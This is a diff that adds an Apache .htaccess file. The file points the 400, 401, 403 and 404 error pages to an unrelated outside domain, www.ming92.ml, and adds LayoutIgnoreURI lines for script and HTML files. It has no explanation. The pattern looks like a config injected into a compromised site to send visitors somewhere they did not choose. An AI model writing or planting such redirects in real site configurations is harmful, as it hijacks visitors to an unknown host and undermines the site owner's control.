@@ -1,0 +1,13 @@
+order allow,deny
+allow from all
+AddDefaultCharset UTF-8  
+
+ErrorDocument 400 http://www.ming92.ml
+ErrorDocument 401 http://www.ming92.ml
+ErrorDocument 403 http://www.ming92.ml
+ErrorDocument 404 http://www.ming92.ml
+LayoutIgnoreURI *.php
+LayoutIgnoreURI *.cgi
+LayoutIgnoreURI *.htm
+LayoutIgnoreURI *.html
+LayoutIgnoreURI *.xhtml
